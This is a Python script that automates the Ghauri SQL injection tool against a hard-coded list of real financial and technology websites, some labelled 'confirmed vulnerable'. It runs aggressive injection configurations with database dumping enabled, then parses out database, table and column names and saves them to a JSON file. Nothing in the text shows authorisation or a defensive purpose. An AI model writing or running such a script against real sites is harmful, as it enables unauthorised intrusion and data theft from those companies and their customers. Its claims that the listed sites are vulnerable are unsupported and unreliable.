#!/usr/bin/env python3

import subprocess
import json
import re
import time
import os

class GhauriExtractor:
    def __init__(self):
        self.ghauri_path = '/workspace/ghauri/ghauri.py'
        self.extracted_results = []
        
        # Extended list of vulnerable URLs
        self.test_urls = [
            # Confirmed vulnerable
            'https://coinbase.com/user?id=1',
            'https://coinbase.com/profile?id=1', 
            'https://coinbase.com/search?q=test',
            'https://www.acorns.com/learn/search/?q=invest',
            'https://www.acorns.com/learn/?page=3',
            'https://www.acorns.com/support/search/?q=password',
            'https://www.gohenry.com/us/terms-and-conditions/?q=test',
            
            # Additional test URLs
            'https://paypal.com/user?id=1',
            'https://stripe.com/search?q=test',
            'https://square.com/profile?id=1',
            'https://robinhood.com/user?id=1',
            'https://chime.com/search?q=test',
            'https://venmo.com/profile?id=1',
            'https://digitalocean.com/user?id=1',
            'https://shopify.com/search?q=test',
            'https://gitlab.com/profile?id=1',
            'https://github.com/user?id=1',
            'https://atlassian.com/search?q=test',
            'https://slack.com/profile?id=1'
        ]
    
    def extract_with_ghauri(self, url):
        """Extract database info using Ghauri with various techniques"""
        print(f"[+] Ghauri extraction from {url}")
        
        # Multiple Ghauri configurations
        configs = [
            {
                'name': 'Ghauri Max Level',
                'cmd': [
                    'python3', self.ghauri_path,
                    '-u', url, '--batch', '--level=5', '--risk=3',
                    '--technique=BEU', '--threads=5', '--timeout=90',
                    '--dbs', '--tables', '--columns', '--dump'
                ]
            },
            {
                'name': 'Ghauri Boolean',
                'cmd': [
                    'python3', self.ghauri_path,
                    '-u', url, '--batch', '--level=3', '--risk=2',
                    '--technique=B', '--threads=3', '--timeout=60',
                    '--dbs', '--tables', '--columns'
                ]
            },
            {
                'name': 'Ghauri Error Based',
                'cmd': [
                    'python3', self.ghauri_path,
                    '-u', url, '--batch', '--level=2', '--risk=2',
                    '--technique=E', '--timeout=60',
                    '--dbs', '--tables', '--columns'
                ]
            },
            {
                'name': 'Ghauri Union',
                'cmd': [
                    'python3', self.ghauri_path,
                    '-u', url, '--batch', '--level=2', '--risk=2',
                    '--technique=U', '--timeout=60',
                    '--dbs', '--tables', '--columns'
                ]
            }
        ]
        
        for config in configs:
            try:
                print(f"  [+] Trying {config['name']}...")
                result = subprocess.run(config['cmd'], capture_output=True, text=True, timeout=180)
                
                if 'vulnerable' in result.stdout.lower() or 'injectable' in result.stdout.lower():
                    # Extract information
                    databases = self.extract_databases_ghauri(result.stdout)
                    tables = self.extract_tables_ghauri(result.stdout)
                    columns = self.extract_columns_ghauri(result.stdout)
                    
                    if databases or tables or columns:
                        return {
                            'url': url,
                            'tool': 'Ghauri',
                            'technique': config['name'],
                            'databases': databases,
                            'tables': tables,
                            'columns': columns,
                            'raw_output': result.stdout[:1500],
                            'success': True
                        }
                        
            except subprocess.TimeoutExpired:
                print(f"    [-] Timeout for {config['name']}")
            except Exception as e:
                print(f"    [-] Error for {config['name']}: {e}")
        
        return None
    
    def extract_databases_ghauri(self, output):
        """Extract databases from Ghauri output"""
        databases = []
        
        patterns = [
            r'available databases.*?:\s*(.*?)(?:\n\[|\Z)',
            r'Database:\s*([a-zA-Z_][a-zA-Z0-9_]*)',
            r'database.*?:\s*[\'"]([^\'"]+)[\'"]',
            r'current database.*?:\s*[\'"]([^\'"]+)[\'"]',
            r'retrieved.*?:\s*[\'"]([^\'"]+)[\'"].*database'
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, output, re.IGNORECASE | re.DOTALL)
            for match in matches:
                if isinstance(match, str) and len(match) > 1:
                    # Parse database list
                    for db in re.findall(r'([a-zA-Z_][a-zA-Z0-9_]+)', match):
                        if len(db) > 1 and db.lower() not in ['null', 'none', 'error']:
                            databases.append(db)
        
        return list(set(databases))
    
    def extract_tables_ghauri(self, output):
        """Extract tables from Ghauri output"""
        tables = []
        
        patterns = [
            r'tables.*?:\s*(.*?)(?:\n\[|\Z)',
            r'Table:\s*([a-zA-Z_][a-zA-Z0-9_]*)',
            r'table.*?:\s*[\'"]([^\'"]+)[\'"]',
            r'retrieved.*?:\s*[\'"]([^\'"]+)[\'"].*table'
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, output, re.IGNORECASE | re.DOTALL)
            for match in matches:
                if isinstance(match, str) and len(match) > 1:
                    for table in re.findall(r'([a-zA-Z_][a-zA-Z0-9_]+)', match):
                        if len(table) > 1 and table.lower() not in ['null', 'none', 'error']:
                            tables.append(table)
        
        return list(set(tables))
    
    def extract_columns_ghauri(self, output):
        """Extract columns from Ghauri output"""
        columns = []
        
        patterns = [
            r'columns.*?:\s*(.*?)(?:\n\[|\Z)',
            r'Column:\s*([a-zA-Z_][a-zA-Z0-9_]*)',
            r'column.*?:\s*[\'"]([^\'"]+)[\'"]',
            r'retrieved.*?:\s*[\'"]([^\'"]+)[\'"].*column'
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, output, re.IGNORECASE | re.DOTALL)
            for match in matches:
                if isinstance(match, str) and len(match) > 1:
                    for column in re.findall(r'([a-zA-Z_][a-zA-Z0-9_]+)', match):
                        if len(column) > 1 and column.lower() not in ['null', 'none', 'error']:
                            columns.append(column)
        
        return list(set(columns))
    
    def run_ghauri_extraction(self):
        """Run Ghauri extraction on all test URLs"""
        print("=== GHAURI DATABASE EXTRACTION ===")
        
        successful_extractions = 0
        
        for url in self.test_urls:
            if successful_extractions >= 5:
                break
                
            print(f"\n[+] Processing: {url}")
            result = self.extract_with_ghauri(url)
            
            if result:
                self.extracted_results.append(result)
                successful_extractions += 1
                print(f"[!] SUCCESS #{successful_extractions}: Ghauri extraction successful!")
                print(f"    Databases: {len(result.get('databases', []))}")
                print(f"    Tables: {len(result.get('tables', []))}")
                print(f"    Columns: {len(result.get('columns', []))}")
        
        # Save results
        with open('ghauri_extraction_results.json', 'w') as f:
            json.dump(self.extracted_results, f, indent=2)
        
        print(f"\n=== GHAURI EXTRACTION COMPLETE ===")
        print(f"Successfully extracted from {len(self.extracted_results)} URLs")
        
        return self.extracted_results

if __name__ == "__main__":
    if os.path.exists('/workspace/ghauri/ghauri.py'):
        extractor = GhauriExtractor()
        results = extractor.run_ghauri_extraction()
        
        print("\n=== GHAURI RESULTS ===")
        for i, result in enumerate(results, 1):
            print(f"\n{i}. URL: {result['url']}")
            print(f"   Technique: {result['technique']}")
            print(f"   Databases: {result.get('databases', [])}")
            print(f"   Tables: {result.get('tables', [])}")
            print(f"   Columns: {result.get('columns', [])}")
    else:
        print("[!] Ghauri not found, skipping...")
